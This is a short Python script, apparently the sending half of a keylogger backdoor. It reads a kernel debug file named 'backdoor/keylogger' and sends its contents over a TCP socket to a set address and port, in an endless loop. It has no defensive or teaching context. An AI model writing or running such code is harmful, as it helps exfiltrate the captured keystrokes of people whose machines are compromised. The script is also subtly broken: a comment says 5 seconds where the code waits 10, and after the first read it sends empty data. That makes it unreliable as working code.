import socket
import time

def send_file(filename, destination_address, destination_port):
    # CREATE SOCKET
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # CONNECT TO SERVER
        sock.connect((destination_address, destination_port))

        # OPEN FILE TO READ
        with open(filename, 'rb') as file:
            while True:
                # READ FILE
                data = file.read()

                # SEND FILE TO SERVER
                sock.sendall(data)

                # WAIT 5 SECONDS TO SEND THE FILE AGAIN
                time.sleep(10)

    finally:
        # CLOSES SOCKET
        sock.close()


# EXECUTES THE CLIENT
if __name__ == '__main__':
    target_file = '/sys/kernel/debug/backdoor/keylogger'
    destination_address = '127.0.0.1'  
    destination_port = 8080  

    send_file(target_file, destination_address, destination_port)
